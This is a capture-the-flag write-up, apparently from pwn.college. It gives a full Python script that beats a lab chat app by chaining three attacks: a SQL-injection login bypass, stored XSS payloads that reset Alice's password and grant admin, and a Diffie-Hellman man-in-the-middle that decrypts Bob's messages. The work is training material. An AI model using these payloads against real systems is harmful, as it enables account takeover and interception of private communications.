# Secure Chat 2

#### Overall same structure as last challenge except now it requires bypassing Alice completely. Initially I attempted to inject bob with a fake key and have him us that, but the real Alice would also send a key and it would corrupt the decryption. Instead I just changed Alice's password so she couldn't send messages anymore and used Mallory to inject
```python
import requests
from Crypto.Util.Padding import unpad, pad
from Crypto.Cipher import AES
import re
import time

DH_p = int.from_bytes(bytes.fromhex(
"FFFFFFFF FFFFFFFF C90FDAA2 2168C234 C4C6628B 80DC1CD1 "
"29024E08 8A67CC74 020BBEA6 3B139B22 514A0879 8E3404DD "
"EF9519B3 CD3A431B 302B0A6D F25F1437 4FE1356D 6D51C245 "
"E485B576 625E7EC6 F44C42E9 A637ED6B 0BFF5CB6 F406B7ED "
"EE386BFB 5A899FA5 AE9F2411 7C4B1FE6 49286651 ECE45B3D "
"C2007CB8 A163BF05 98DA4836 1C55D39A 69163FA8 FD24CF5F "
"83655D23 DCA3AD96 1C62F356 208552BB 9ED52907 7096966D "
"670C354E 4ABC9804 F1746C08 CA18217C 32905E46 2E36CE3B "
"E39E772C 180E8603 9B2783A2 EC07A28F B5C55DF0 6F4C52C9 "
"DE2BCBF6 95581718 3995497C EA956AE5 15D22618 98FA0510 "
"15728E5A 8AACAA68 FFFFFFFF FFFFFFFF"
), "big")
DH_g = 2

def hack():
    t_addr = 'http://10.0.0.1'
    s = requests.Session()

    pri_key = 1337
    pub_key = pow(DH_g, pri_key, DH_p)
    print(f'[*] Generated fake key: {pub_key}')

    print('\nLogging in as Mallory...')
    log_on = "' UNION SELECT 'mallory', 'x', 0 --" 
    s.post(f'{t_addr}/login', data={'username': log_on, 'password': 'x'})
    
    if 'Hello mallory!' not in s.get(f'{t_addr}/').text:
        print('Failed to log in')
        return

    print('Changing Alice\'s password...')
    silence_js = """<script>
    fetch("/user/alice/modify", {
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        body: "password=hacked&admin=true"
    });
    </script>""".replace('\n', '')
    s.post(f'{t_addr}/chat/alice', data={'message': silence_js})
    time.sleep(5) 

    print('Sending bob fake message...')
    bob_msg = f"Hey Bob, I need to chat with you about something important. Let's chat securely over DHE-AES: {pub_key}."
    key_js = f"""<script>
        fetch("/chat/bob", {{
            method: "POST",
            headers: {{"Content-Type": "application/x-www-form-urlencoded"}},
            body: "message=" + encodeURIComponent("{bob_msg}")
        }});
    </script>""".replace('\n', '')
    s.post(f'{t_addr}/chat/alice', data={'message': key_js})
    time.sleep(5)

    print('Sending Alice the message to trigger conversation...')
    s.post(f"{t_addr}/chat/alice", data={"message": "I heard someone shared the flag with Bob!"})
    time.sleep(10)

    print('Logging in as Bob...')
    s = requests.Session()
    s.post(f'{t_addr}/login', data={'username': f"' UNION SELECT 'bob', 'x', 0 --", 'password': 'x'})
    
    chats = s.get(f"{t_addr}/chat/alice").text
    get_bob_key = re.search(r"sure: (\d+)\.", chats)
    if not get_bob_key:
        print("No messages.")
        return

    bob_key = int(get_bob_key.group(1))
    print(f'Found Bob\'s key: {bob_key}')

    secret = pow(bob_key, pri_key, DH_p)
    aes_key = secret.to_bytes(256, "big")[:16]
    cipher_encrypt = AES.new(aes_key, AES.MODE_ECB)
    print(f"Shared AES Key: {aes_key.hex()}")

    print('Requesting Bob tell Alice...')
    q = "Hey Bob, I know that someone shared the flag with you. Who was it?"
    enc_q = cipher_encrypt.encrypt(pad(q.encode(), 16)).hex()
    
    s = requests.Session()
    s.post(f'{t_addr}/login', data={'username': log_on, 'password': 'x'})
    
    q_js = f"""<script>
        fetch("/chat/bob", {{
            method: "POST",
            headers: {{"Content-Type": "application/x-www-form-urlencoded"}},
            body: "message=" + "{enc_q}"
        }});
    </script>""".replace('\n', '')
    s.post(f'{t_addr}/chat/alice', data={'message': q_js})
    time.sleep(5)

    print('Decrypting flag...')
    s = requests.Session()
    s.post(f'{t_addr}/login', data={'username': f"' UNION SELECT 'bob', 'x', 0 --", 'password': 'x'})
    chats = s.get(f"{t_addr}/chat/alice").text
    
    cipher_decrypt = AES.new(aes_key, AES.MODE_ECB)
    m = re.findall(r"(?:alice|bob): ([0-9a-f]+)", chats)

    for d in m:
        try:
            decrypted = unpad(cipher_decrypt.decrypt(bytes.fromhex(d)), 16).decode()
            print(f"Decrypted: {decrypted}")
            if "pwn.college{" in decrypted:
                print(f"\n[!!!] FLAG: {decrypted}")
                break
        except:
            pass

if __name__ == "__main__":
    hack()

```
